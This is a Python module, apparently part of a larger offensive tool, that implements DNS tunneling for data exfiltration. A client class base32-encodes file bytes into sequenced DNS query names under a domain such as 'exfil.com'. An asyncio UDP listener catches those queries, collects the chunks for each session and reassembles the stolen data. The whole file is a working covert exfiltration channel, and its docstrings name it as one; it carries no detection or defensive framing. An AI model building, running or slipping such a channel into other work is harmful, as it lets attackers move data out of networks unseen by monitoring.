import logging
import base64
import socket
import struct
import asyncio
from typing import Dict, List, Optional
from datetime import datetime, timezone

logger = logging.getLogger(__name__)

try:
    from dnslib import DNSRecord, DNSHeader, RR, A, QTYPE
except ImportError:
    logger.warning("dnslib not installed. DNS Tunneling will be disabled.")
    DNSRecord = None

class DNSClientEncoder:
    """
    Encodes data into DNS queries for exfiltration.
    Format: <sequence>.<chunk>.<session_id>.<domain>
    """
    def __init__(self, domain: str, session_id: str):
        self.domain = domain
        self.session_id = session_id
        self.seq = 0
        
    def encode_file(self, data: bytes, chunk_size: int = 30) -> List[str]:
        """Encodes bytes into a list of DNS query domains."""
        encoded = base64.b32encode(data).decode().replace("=", "")
        chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
        
        queries = []
        for chunk in chunks:
            # seq.chunk.session.domain
            q = f"{self.seq}.{chunk}.{self.session_id}.{self.domain}"
            queries.append(q)
            self.seq += 1
            
        # End of transmission marker
        queries.append(f"end.{self.seq}.{self.session_id}.{self.domain}")
        return queries

class DNSTunnelListener:
    """
    Listens for DNS queries and reassembles exfiltrated data.
    """
    def __init__(self, port: int = 5353, domain: str = "exfil.com"):
        self.port = port
        self.domain = domain
        self.sessions: Dict[str, Dict] = {} # {session_id: {seq: data}}
        self.sock = None
        self.running = False
        
    async def start(self):
        if not DNSRecord:
            logger.error("dnslib missing.")
            return

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            self.sock.bind(("0.0.0.0", self.port))
            self.sock.setblocking(False)
            self.running = True
            logger.info(f"[DNS] Listening on port {self.port} for domain {self.domain}")
            
            asyncio.create_task(self._listen_loop())
        except Exception as e:
            logger.error(f"[DNS] Bind failed: {e}")

    async def stop(self):
        self.running = False
        if self.sock:
            self.sock.close()

    async def _listen_loop(self):
        loop = asyncio.get_event_loop()
        while self.running:
            try:
                data, addr = await loop.sock_recvfrom(self.sock, 512)
                self._handle_packet(data, addr)
            except Exception as e:
                logger.error(f"[DNS] Receive error: {e}")
                await asyncio.sleep(1)

    def _handle_packet(self, data: bytes, addr):
        try:
            d = DNSRecord.parse(data)
            qname = str(d.q.qname).rstrip(".")
            
            # Filter for our domain
            if not qname.endswith(self.domain):
                return

            # Parse: seq.chunk.session.domain...
            # Remove domain part
            payload_part = qname[:-len(self.domain)-1]
            parts = payload_part.split('.')
            
            if len(parts) >= 3:
                seq_str = parts[0]
                chunk = parts[1]
                session_id = parts[2]
                
                if session_id not in self.sessions:
                    self.sessions[session_id] = {"chunks": {}, "complete": False, "last_seen": datetime.now(timezone.utc)}
                
                if seq_str == "end":
                    self.sessions[session_id]["complete"] = True
                    logger.info(f"[DNS] Session {session_id} transmission complete.")
                    self._reassemble(session_id)
                else:
                    try:
                        seq = int(seq_str)
                        self.sessions[session_id]["chunks"][seq] = chunk
                        self.sessions[session_id]["last_seen"] = datetime.now(timezone.utc)
                    except ValueError:
                        pass
                        
            # Respond with NXDOMAIN or A record (sinkhole)
            reply = d.reply()
            reply.add_answer(RR(d.q.qname, QTYPE.A, rdata=A("127.0.0.1"), ttl=60))
            self.sock.sendto(reply.pack(), addr)
            
        except Exception as e:
            pass # Malformed packet

    def _reassemble(self, session_id: str):
        try:
            session = self.sessions[session_id]
            chunks = session["chunks"]
            sorted_seqs = sorted(chunks.keys())
            
            full_b32 = "".join([chunks[s] for s in sorted_seqs])
            # Add padding if needed
            missing_padding = len(full_b32) % 8
            if missing_padding:
                full_b32 += "=" * (8 - missing_padding)
                
            decoded_data = base64.b32decode(full_b32)
            
            # For now, just store/log. In real app, save to file.
            session["decoded_data"] = decoded_data
            # session["decoded_text"] = decoded_data.decode(errors='ignore')
            logger.info(f"[DNS] Session {session_id} reassembled {len(decoded_data)} bytes.")
            
        except Exception as e:
            logger.error(f"[DNS] Reassembly failed for {session_id}: {e}")

    def get_session_data(self, session_id: str) -> Optional[bytes]:
        return self.sessions.get(session_id, {}).get("decoded_data")

